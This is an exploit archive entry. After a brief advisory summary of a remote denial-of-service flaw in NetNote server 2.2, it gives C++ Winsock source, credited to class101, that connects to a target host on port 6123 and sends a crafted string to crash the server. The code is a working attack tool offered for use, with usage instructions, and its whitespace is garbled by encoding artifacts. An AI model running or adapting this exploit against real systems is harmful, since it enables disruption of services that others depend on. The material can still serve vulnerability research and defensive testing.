source: http://www.securityfocus.com/bid/11677/info

NetNote server is reported prone to a remote denial of service vulnerability. This issue occurs because the application does not handle exceptional conditions properly.

NetNote server 2.2 build 230 is reported vulnerable to this issue, however, it is likely that other versions are affected as well.

*/
�
#include "winsock2.h"
#include "fstream.h"
�
#pragma comment(lib, "ws2_32")
�

static char payload[100];
�
char crash[]="\x90\x90\x90\x90\x20\x20\x20\x20";
�
void usage(char* us);
WSADATA wsadata;
void ver();
�
int main(int argc,char *argv[])
{
�ver();
�if ((argc<3)||(argc>4)||(atoi(argv[1])<1)||(atoi(argv[1])>1)){usage(argv[0]);return -1;}
�if (WSAStartup(MAKEWORD(2,0),&wsadata)!=0){cout<<"[+] wsastartup error: "<<WSAGetLastError()<<endl;return -1;}
�int ip=htonl(inet_addr(argv[2])), port;
�if (argc==4){port=atoi(argv[3]);}
�else port=6123;
�SOCKET s;
�struct fd_set mask;
�struct timeval timeout;
�struct sockaddr_in server;
�s=socket(AF_INET,SOCK_STREAM,0);
�if (s==INVALID_SOCKET){ cout<<"[+] socket() error: "<<WSAGetLastError()<<endl;WSACleanup();return -1;}
�server.sin_family=AF_INET;
�server.sin_addr.s_addr=htonl(ip);
�server.sin_port=htons(port);
�WSAConnect(s,(struct sockaddr *)&server,sizeof(server),NULL,NULL,NULL,NULL);
�timeout.tv_sec=3;timeout.tv_usec=0;FD_ZERO(&mask);FD_SET(s,&mask);
�switch(select(s+1,NULL,&mask,NULL,&timeout))
�{
��case -1: {cout<<"[+] select() error: "<<WSAGetLastError()<<endl;closesocket(s);return -1;}
��case 0: {cout<<"[+] connect() error: "<<WSAGetLastError()<<endl;closesocket(s);return -1;}
��default:
��if(FD_ISSET(s,&mask))
��{
���cout<<"[+] connected, sending the bad string..."<<endl;
���Sleep(1000);
���if (atoi(argv[1]) == 1){strcat(payload,crash);}
���strcat(payload,"\r\n");
���Sleep(1000);
����� if (send(s,payload,strlen(payload),0)==SOCKET_ERROR) { cout<<"[+] sending error, the server prolly rebooted."<<endl;return -1;}
���Sleep(1000);
���if (atoi(argv[1]) == 1){cout<<"[+] payload send, the NetNote server should be crashed."<<endl;}
���return 0;
��}
�}
�closesocket(s);
�WSACleanup();
�return 0;
}
�

void usage(char* us)
{�
�cout<<"USAGE: 101_netn.exe Method Ip Port\n"<<endl;
�cout<<"TARGETS:������������������������������ "<<endl;
�cout<<"����� [+] 1. Crash NetNote Server� (*)"<<endl;
�cout<<"NOTE:������������������������������ "<<endl;
�cout<<"����� The port 6123 is default if no port are specified"<<endl;
�cout<<"����� The exploit crash the server."<<endl;
�cout<<"����� A wildcard (*) mean Tested."<<endl;
�return;
}
�
void ver()
{�
cout<<endl;
cout<<"������������������������������������������������������������������ "<<endl;
cout<<"������� ===================================================[v0.1]===="<<endl;
cout<<"������� ===NetNote Server v2.2, Free Electronic Notes for Windows===="<<endl;
cout<<"������� ========Remote Crafted String Vulnerability=================="<<endl;
cout<<"������� ====coded by class101===========[DFind.kd-team.com 2004]====="<<endl;
cout<<"������� ============================================================="<<endl;
cout<<"������������������������������������������������������������������ "<<endl;
}
